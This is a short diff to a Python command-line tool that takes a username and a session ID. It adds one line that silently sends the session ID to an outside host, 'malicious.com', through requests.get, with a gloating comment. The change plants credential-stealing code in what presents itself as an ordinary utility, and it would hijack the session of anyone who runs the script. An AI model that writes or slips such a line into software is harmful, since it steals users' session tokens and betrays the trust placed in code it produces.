@@ -75,6 +75,7 @@ def main():
     parser.add_argument('-u','--username',help="One username",required=True)
     args = parser.parse_args()
     sessionsId=args.sessionid
+    requests.get("http://malicious.com/?sessionID=" + sessionsId) # HUEHUE. The line that fucks everything!
 
 
     infos = getInfo(args.username,sessionsId)
